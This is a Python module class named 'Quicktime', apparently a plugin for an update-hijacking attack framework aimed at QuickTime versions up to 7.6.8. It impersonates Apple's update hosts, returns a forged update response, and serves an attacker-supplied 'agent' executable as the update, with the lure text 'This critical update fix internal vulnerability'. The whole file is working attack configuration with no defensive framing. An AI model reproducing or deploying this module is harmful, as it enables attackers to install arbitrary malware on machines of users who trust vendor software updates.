from modules import ModuleBase


class Quicktime(ModuleBase):
    name = 'Quicktime'
    version = '1.0'
    appver = ' <= 7.6.8'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(qtsoftware.apple.com|www.apple.com)' 
    requests = [{   
        'path': '/cgi-bin/query',
        'type': 'file',
        'method': '',
        'bin': 0,
        'string': '',
        'parse': 1,
        'headers' : {'content-type': 'application/x-quicktime-response'},
        'file': './include/quicktime/update.txt'
    }, {    
        'path': '.exe',
        'type': 'agent',
        'method': '',
        'bin': 1,
        'string': '',
        'parse': 0,
        'file': ''
    }]
    options = {
        'description': {
            'val': 'This critical update fix internal vulnerability',
            'desc': 'Description to be displayed during the update'
        },
        'version': {
            'val': 'rand_num(2)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
